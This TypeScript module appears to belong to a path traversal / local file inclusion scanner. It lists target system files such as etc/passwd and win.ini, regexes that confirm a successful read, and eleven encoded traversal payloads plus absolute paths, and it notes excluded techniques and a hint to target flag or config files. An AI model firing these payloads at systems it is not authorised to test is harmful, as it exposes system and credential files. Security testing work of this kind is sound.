const LFI_DEPTH = 12

export const LFI_TARGETS: { file: string; sig: RegExp; os: "unix" | "windows" }[] = [
  { file: "etc/passwd", sig: /root:[^:\r\n]*:0:0:/, os: "unix" },
  { file: "windows/win.ini", sig: /\[fonts\]|\[extensions\]|for 16-bit app support/i, os: "windows" },
  {
    file: "windows/system32/drivers/etc/hosts",
    sig: /# Copyright.{0,40}Microsoft|127\.0\.0\.1\s+localhost/i,
    os: "windows",
  },
  { file: "boot.ini", sig: /\[boot loader\]/i, os: "windows" },
]

export const LFI_TECHNIQUES: { name: string; slash: "fwd" | "back"; make: (f: string) => string }[] = [
  { name: "../", slash: "fwd", make: (f) => "../".repeat(LFI_DEPTH) + f },
  { name: "..\\", slash: "back", make: (f) => "..\\".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") },
  { name: "..%2f", slash: "fwd", make: (f) => "..%2f".repeat(LFI_DEPTH) + f },
  { name: "..%5c", slash: "back", make: (f) => "..%5c".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") },
  { name: "%2e%2e%2f", slash: "fwd", make: (f) => "%2e%2e%2f".repeat(LFI_DEPTH) + f },
  { name: "..%252f", slash: "fwd", make: (f) => "..%252f".repeat(LFI_DEPTH) + f },
  { name: "....//", slash: "fwd", make: (f) => "....//".repeat(LFI_DEPTH) + f },
  { name: "....\\\\", slash: "back", make: (f) => "....\\\\".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") },
  { name: "....\\/", slash: "fwd", make: (f) => "....\\/".repeat(LFI_DEPTH) + f },
  { name: "..../\\", slash: "back", make: (f) => "..../\\".repeat(LFI_DEPTH) + f.replace(/\//g, "\\") },
  { name: "null-byte", slash: "fwd", make: (f) => "../".repeat(LFI_DEPTH) + f + "%00" },
]

export const LFI_ABSOLUTE: { name: string; make: (f: string) => string; os: "unix" | "windows" }[] = [
  { name: "absolute /", make: (f) => "/" + f, os: "unix" },
  { name: "absolute C:\\", make: (f) => "C:\\" + f.replace(/\//g, "\\"), os: "windows" },
  { name: "absolute C:/", make: (f) => "C:/" + f, os: "windows" },
]

export const LFI_NOT_TESTED = [
  "wrapper-based inclusion (php://, data://, expect://, phar://) — RCE-capable, deliberately excluded",
  "remote file inclusion (RFI, http://…) — SSRF/OOB, deliberately excluded",
  "app-specific target files — the tool confirms the traversal SHAPE against known OS files; swap in FLAG.php/config yourself",
  "same-directory sibling read WITHOUT traversal (e.g. filename=secret in a served dir)",
  "second-order / archive-extraction (zip-slip) / upload-then-include chains",
]
